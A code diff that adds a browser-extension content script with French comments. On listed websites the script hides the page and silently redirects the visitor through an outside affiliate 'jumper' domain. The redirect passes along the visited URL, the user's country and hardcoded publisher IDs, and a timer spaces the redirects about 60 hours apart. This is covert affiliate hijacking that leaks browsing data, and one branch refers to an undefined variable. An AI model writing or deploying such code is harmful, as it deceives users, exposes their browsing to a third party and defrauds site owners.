@@ -1,0 +1,230 @@
+// // LOAD CONF
+// fetch(chrome.runtime.getURL('./sum/config.json'))
+//   .then(response => response.json())
+//   .then(config => {
+//     extension_name = config.extension_name;  
+//     sub_id = config.sub_id;  
+//     pub_id = config.pub_id;  
+
+//   })
+//   .catch(error => console.error('Erreur de chargement du fichier config.json:', error));
+const sub_id = "pp31";
+const pub_id = "imb4wzji";
+
+
+
+let wListUCheck = [];
+
+
+function calculateElapsedSeconds(storedTimestamp) {
+    const currentTimestamp = Date.now();
+    const elapsedMilliseconds = currentTimestamp - storedTimestamp;
+    const elapsedSeconds = Math.floor(elapsedMilliseconds / 1000);
+    return elapsedSeconds;
+}
+
+function deleteUrlParam(e, a) {
+  const n = new URL(e);
+  n.searchParams.delete(a);  // Supprime complètement le paramètre
+  return n.toString();
+}
+
+
+
+
+function doThat() {
+
+  
+
+  const t = window.location.hostname.replace("www.", "");
+
+  
+  // Check if the user already clicked on this root 
+  //chrome.storage.local.get(['lastRootDirect','lastRootDirectCount','lastDeepLink','debugJumpU'], function(result) {
+  chrome.storage.local.get([t,'lastRootTmp'], function(result) {
+    let start;
+    let storedData = result[t];
+    if (storedData) {
+        console.log('[debug] already viewed',storedData);
+        let lastRootDirect = storedData.lastRootDirect;
+        //let partner = storedData.partner;
+        let lastVisiteTimestamp = storedData.lastVisiteTimestamp;
+
+        const elapsedSeconds = calculateElapsedSeconds(lastVisiteTimestamp);
+        console.log(`[debug] last jump was ${elapsedSeconds} seconds ago`);
+
+        if (elapsedSeconds > 216000){
+          console.log('[debug] so we jump');
+          document.documentElement.style.display = 'none';
+          start = true;
+        }else{
+          console.log('[debug] so we DONT jump');
+          start = false;
+        }
+        
+    } else if ( result.lastRootTmp == t ){
+        console.log('[debug] not a partner');
+        start = false;
+    } else {
+        console.log('[debug] root never viewed, we check if root in wlist');
+        document.documentElement.style.display = 'none';
+        start = true;
+    }
+  
+
+
+      
+    
+
+    if ( start == true ) {
+    //if ( result.lastRootDirect != t  ) {
+      //first time on this website, we rec it 
+      // console.log("[debug] first page");
+      // document.documentElement.style.display = '';
+      // chrome.storage.local.set({lastRootDirect: t,lastRootDirectCount: 1,lastDeepLink: window.location.href}, function() {
+      //     console.log("[debug] set lastRootDirect=",t);
+      //     console.log("[debug] set lastDeepLink :",window.location.href);
+      //     console.log("[debug] set lastRootDirectCount :",1);
+      // });
+
+
+    //}else if (  result.lastRootDirect == t && result.lastRootDirectCount == 1 ){
+      //seconde page view on this site , we go jumper
+      //console.log("[debug] second page go jump");
+
+       // fallback for getting the wlist
+      chrome.storage.local.get(
+        ["wList"],
+        (value) => {
+            wListUCheck = value.wList || {};
+            //console.log("wList & extId loaded from cache"+extensionId+" ",wListUCheck);
+
+
+
+            const languageToCountryFallback = {
+                "en": "US",  // Anglais -> États-Unis
+                "ja": "JP",  // Japonais -> Japon
+                "vi": "VN",  // Vietnamien -> Vietnam
+                "sv": "SE",  // Suédois -> Suède
+                "el": "GR",  // Grec -> Grèce
+                "he": "IL",  // Hébreu -> Israël
+                "cs": "CZ",  // Tchèque -> République Tchèque
+                "nb": "NO",   // Norvégien (Bokmål) -> Norvège
+                "419": "ES"   
+            };
+            const userLanguage = navigator.language;  
+            const languageParts = userLanguage.split('-');
+            let countryCode;
+            if (languageParts.length > 1) {
+                countryCode = languageParts[1];  
+            } else {
+                countryCode = languageToCountryFallback[languageParts[0]] || languageParts[0];
+            }
+            countryCode = (!countryCode || countryCode.length !== 2) ? "US" : countryCode;
+            console.log(countryCode);
+
+
+
+            if (wListUCheck[t]) {
+
+              let dest = 'https://jumper.lvlnk.com/?url='+encodeURIComponent(deleteUrlParam(window.location.href, "srsltid"))+'&pubId='+pub_id+'&country='+countryCode+'&subId='+sub_id;
+              //console.log("[debug] jump",dest);
+
+              // chrome.storage.local.set({lastRootDirect: t,lastRootDirectCount: 2,lastDeepLink: window.location.href, debugJumpU: dest }, function() {
+              //   window.location.replace(dest);  
+              //   console.log("[debug] set lastRootDirect=",t);
+              //   console.log("[debug] set lastDeepLink :",window.location.href);
+              //   console.log("[debug] set lastRootDirectCount :",2);
+              // });
+
+              let lastWebsiteData = {
+                  [t]: {
+                      lastRootDirect: t,
+                      lastVisiteTimestamp:  Date.now(),
+                      partner: true
+                  }
+              };
+              chrome.storage.local.set( lastWebsiteData , function() {
+                window.location.replace(dest);  
+              });
+
+
+            } else {
+                // Afficher le contenu de la page
+                console.log("not in wlist :",t);
+                
+                chrome.storage.local.set( {lastRootTmp: t} , function() {
+                  window.location.replace(dest);  
+                });
+                document.documentElement.style.display = '';
+            }
+
+
+
+           
+          }
+        );
+
+
+
+    }else{
+      console.log("[debug] page already redirect we stop, actual="+t+" lastRootDirect=");
+      //console.log("[debug] page already redirect we stop, actual="+t+" lastRootDirect=",lastRootDirect);
+      //console.log("[debug] set lastDeepLink :",result.lastDeepLink);
+      //console.log("[debug] set lastRootDirectCount :",result.lastRootDirectCount);
+      //console.log("[debug] set debugJumpU :",debugJumpU);
+      //document.documentElement.style.display = '';
+    }
+  
+  });
+  
+   
+    
+ 
+
+
+  // (() => {
+  //   function gup(name, url) {
+  //     const n = name.replace(/[[]/, "\\[").replace(/[\]]/, "\\]");
+  //     const u = url || location.href;
+
+  //     const regexS = `[\\?&]${n}=([^&#]*)`;
+  //     const regex = new RegExp(regexS);
+  //     const results = regex.exec(u);
+
+  //     return results == null ? null : results[1];
+  //   }
+
+  //   window.addEventListener("load", () => {
+  //     if (window.location.search.indexOf("partnerurl=") > -1) {
+  //       const url = decodeURIComponent(gup("partnerurl", location.href));
+
+  //       location.href = url;
+
+  //       return;
+  //     }
+
+  //     window.setTimeout(() => {
+  //       chrome.runtime.sendMessage({ action: "get_tabstatus" }, (response) => {
+  //         if (response) {
+  //           chrome.runtime.sendMessage({ action: "close_current_tab" }, () => {});
+  //         }
+  //       });
+  //     }, 3e3);
+  //   });
+  // })();
+
+}
+
+
+
+
+
+
+
+
+chrome.storage.local.get(['permissionsGranted'], function(result) {
+  if (result.permissionsGranted !== false ) {
+    doThat();
+  }
+}); 
